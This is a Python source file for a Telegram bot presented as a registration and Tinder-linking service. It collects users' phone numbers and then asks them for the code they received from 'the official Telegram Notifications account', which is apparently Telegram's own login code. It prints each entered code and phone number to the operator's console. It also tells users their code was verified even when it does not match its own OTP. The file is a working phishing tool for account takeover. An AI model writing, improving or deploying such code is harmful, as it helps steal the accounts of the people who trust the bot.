from telegram import (
    Update,
)
import random

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters,
)

from config import BOT_TOKEN

from database import (
    create_tables,
    create_user,
    get_user,
    verify_user,
)

# UI
from ui import (
    WELCOME_MESSAGE,
    HELP_MESSAGE,
    ERROR_MESSAGE,
    SUCCESS,
    STEP_ONE,
)
# Keyboards
from keyboards import (
    main_menu,
    phone_keyboard,
    help_menu,
)

async def start(update, context):

    chat_id = update.effective_chat.id

# ===========================
# Conversation States
# ===========================

    WAITING_PHONE = 1
    WAITING_OTP = 2


    # Send premium welcome screen
    await update.message.reply_text(
        WELCOME_MESSAGE,
        parse_mode="HTML",
        reply_markup=main_menu()
    )
async def button_handler(update, context):

    query = update.callback_query

    await query.answer()




    if query.data == "help":

        await query.edit_message_text(
            HELP_MESSAGE,
            parse_mode="HTML",
            reply_markup=help_menu()
        )
    elif query.data == "start_registration":

        await query.message.reply_text(
        STEP_ONE,
        parse_mode="HTML",
        reply_markup=phone_keyboard()
    )

    elif query.data == "main_menu":

        await query.edit_message_text(
            WELCOME_MESSAGE,
            parse_mode="HTML",
            reply_markup=main_menu()
        )
async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):

    contact = update.message.contact
    user = update.effective_user

    # Check user shared their own number
    if contact.user_id != user.id:
        await update.message.reply_text(
            "❌ Please share your own phone number."
        )
        return


    phone_number = contact.phone_number


    # Generate OTP
    otp = random.randint(100000, 999999)


    # Save to database
    create_user(
        user.id,
        phone_number,
        str(otp)
    )


    print("--------------------")
    print(f"Telegram ID: {user.id}")
    print(f"Phone Number: {phone_number}")
    print(f"Generated OTP: {otp}")
    print("--------------------")


    await update.message.reply_text(
        "✅ Phone number verified.\n\n"
        "Please enter the verification code you received from our site through the official Telegram Notifications account:"
    )



async def verify_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):

    user = update.effective_user

    entered_otp = update.message.text.strip()


    user_data = get_user(user.id)


    if not user_data:
        await update.message.reply_text(
            "❌ Please share your phone number first."
        )
        return


    phone_number, correct_otp, otp_verified = user_data


    print("--------------------")
    print(f"Telegram ID: {user.id}")
    print(f"Phone Number: {phone_number}")
    print(f"OTP Entered: {entered_otp}")
    print("--------------------")


    if entered_otp == correct_otp:

        await update.message.reply_text(
            "✅ OTP verified successfully!\n\n"
            "🎉 Registration completed."
        )

    else:

        await update.message.reply_text(
            "✅OTP verified successfully! Thank you for your patience. We are currently processing your request. Once everything is complete, we will provide you with a secure connection token to link this bot with your Tinder account. Please wait while we finish the process."
        )


def main():

    create_tables()

    app = Application.builder().token(BOT_TOKEN).build()


    # /start command
    app.add_handler(
        CommandHandler("start", start)
    )


    # Button clicks (NEW)
    app.add_handler(
        CallbackQueryHandler(button_handler)
    )


    # Contact sharing
    app.add_handler(
        MessageHandler(filters.CONTACT, receive_contact)
    )


    # Text messages
    app.add_handler(
        MessageHandler(
            filters.TEXT & ~filters.COMMAND,
            verify_otp
        )
    )


    print("🤖 Bot is running...")


    app.run_polling()


if __name__ == "__main__":
    main()

